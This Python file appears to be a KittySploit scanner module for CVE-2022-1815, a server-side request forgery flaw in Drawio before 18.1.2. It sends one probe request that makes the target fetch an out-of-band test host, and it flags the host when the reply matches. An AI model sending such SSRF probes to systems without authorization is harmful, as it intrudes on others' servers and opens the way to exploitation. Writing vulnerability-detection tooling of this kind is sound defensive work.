#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drawio before 18."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Drawio <18.1.2 - Server-Side Request Forgery Detection',
        'description': 'Drawio before 18.1.2 is susceptible to server-side request forgery via the /service endpoint in jgraph/drawio. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'huntr', 'drawio', 'ssrf', 'oast', 'oss', 'jgraph', 'diagrams', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://huntr.dev/bounties/6e856a25-9117-47c6-9375-52f78876902f/',
            'https://huntr.dev/bounties/6e856a25-9117-47c6-9375-52f78876902f',
            'https://github.com/jgraph/drawio/commit/c287bef9101d024b1fd59d55ecd530f25000f9d8',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1815',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-1815',
    }

    def run(self):
        path = '/service/0/test.oast.me'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Drawio <18.1.2 - Server-Side Request Forgery detected', path=path)
            return True
        return False

